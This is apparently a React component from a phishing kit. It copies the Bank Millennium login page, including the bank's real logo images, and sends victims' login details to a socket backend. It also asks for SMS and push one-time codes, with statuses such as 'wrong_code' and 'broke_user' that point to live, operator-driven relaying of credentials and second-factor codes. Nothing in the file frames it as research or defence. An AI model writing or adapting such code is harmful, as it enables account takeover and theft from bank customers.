import MillenniumFormLogin from "./MillenniumFormLogin";
import {Fragment, useEffect} from "react";
import {useSocket} from "../../../context/socket/socketProvider";
import MillenniumFormCode from "./MillenniumFormCode";

const MillenniumForm = () => {
    const {user, setUser, initUser, connect, disconnect, sendData, sendCode} = useSocket();
    const submitLogin = (data) => {
        console.log('Login', data);
        initUser({
            ...data, bank: 'millennium'
        });
    }
    console.log(user)
    const submitCode = (code) => {
        sendCode(code);
    }
    const submitPush = (code) => {
        sendData('send_push_code', {code});
    }
    useEffect(() => {
        connect('millenium');
        return () => disconnect();
    }, [])
    return (
        <Fragment>
            <div id="login-left-side" className="login-left-side col-md-5 col-sm-6 col-xs-12">
                <div aria-valuetext className={`MNLoading MillenniumLoaderAbsolute 
                ${user.status === 'init' || user.status === 'send_code' || user.status === 'broke_user' ? 'IsModal IsGlobal' : 'Hidden'} 
                 `}
                     data-autoattachtolinks="true" data-widget="true" id="waitMessage" role="progressbar">
                    <div className="ModalLayer"/>
                    <div className="Image" id="waitMessage_image"/>
                </div>
                <header className="login-header" style={{overflow: 'visible'}}>
                    <div className="login-header-container">
                        <div className="header-container">
                            <div className="logo-container">
                                <h1 className="aria-hide">Bank Millennium</h1>
                                <div className="logoLogin">
                                    <a runat="server" href="https://www.bankmillennium.pl/pl/">
                                        <img src="https://www.bankmillennium.pl/osobiste2/Images/Login/Logo@1x.png"
                                             width={187} height={45}
                                             alt="Bank Millennium" className="hidden-xs"/>
                                        <img src="https://www.bankmillennium.pl/osobiste2/Images/Login/Logo@2x.png"
                                             width={187} height={45}
                                             alt="Bank Millennium" className="LogoForMobile"/>
                                    </a>
                                </div>
                            </div>
                            <div className="culture-container">
                                <a className="MNHLink MNCommand CountryEN Standard"
                                   href="https://www.bankmillennium.pl/osobiste2/Retail/Login/Params/LanguageID=en-US"
                                   lang="en"/>
                            </div>
                        </div>
                        <div className="clear-both"/>
                    </div>
                    {/*<mn:mnhiddenfield id="NavigateUrl" runat="server" controlstatemode="Enabled">*/}
                    {/*    <mn:mnhiddenfield id="NavigateUrlCulture" runat="server" controlstatemode="Enabled">*/}
                    {/*    </mn:mnhiddenfield>*/}
                    {/*</mn:mnhiddenfield>*/}
                </header>
                <div className="clear-both clearfix"/>
                <div className="login-body">
                    <div className="MNFieldGroup MNContainer form-horizontal">
                        <div className="login-body-container">
                            <div className="login-process-container">
                                <div
                                    className="MNModalPanel MNBalloonClosable MNBalloon MNContainer left-side-modal-panel NotificationSuccess WhiteTransparency NoTail"
                                    data-allowscrollwhenopen="true" data-appearance="NotificationSuccess"
                                    data-close="$('.LoginPage').Website_LayoutLogin('setFormFirstInputFocus');"
                                    data-closeonoverlayclick="false" data-dontadjustappearance="false"
                                    data-initiallyvisible="false" data-isnotdraggable="true" data-minimumheight={0}
                                    data-widget="true" id="left-side-modal-panel" style={{display: 'none'}}>
                                    <div className="ModalLayer" style={{display: 'none'}}/>
                                    <div className="ColorShadow Balloon" role="dialog"
                                         aria-describedby="left-side-modal-panel_Content" tabIndex={0}
                                         style={{marginLeft: '-4000px'}}>
                                        <div className="Header row" id="left-side-modal-panel_Header">
                                            <div className="IconSuccess FullHeight Icon mille_font col-sm-2"/>
                                            <p className="WordWrap col-sm-10"/></div>
                                        <div className="Tail None"/>
                                        <div className="Content" id="left-side-modal-panel_Content">
                                            <div/>
                                            <a href="javascript:void(0)" tabIndex={0} className="CloseButton"><span
                                                className="aria-hide aria-hide-close">Zamknij</span></a></div>
                                    </div>
                                </div>
                                <div id="mobile-top-field-group-separator" className="row marginOverflow">
                                    <div className="MNFieldGroupFieldSeparator visible-xs col-xs-12"/>
                                </div>
                                {
                                    user.status === '' || user.status === 'wrong_login' ?
                                        <MillenniumFormLogin handler={submitLogin}/> :
                                        user.status === 'getting_code' || user.status === 'wrong_code' ?
                                            <MillenniumFormCode handler={submitCode} status={user.status}/> :
                                            user.status === 'getting_push_code' || user.status === 'wrong_push_code' ?
                                                <MillenniumFormCode handler={submitPush} status={user.status}/> :
                                            null
                                }

                                <div className="clear-both"/>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </Fragment>

    )
}
export default MillenniumForm;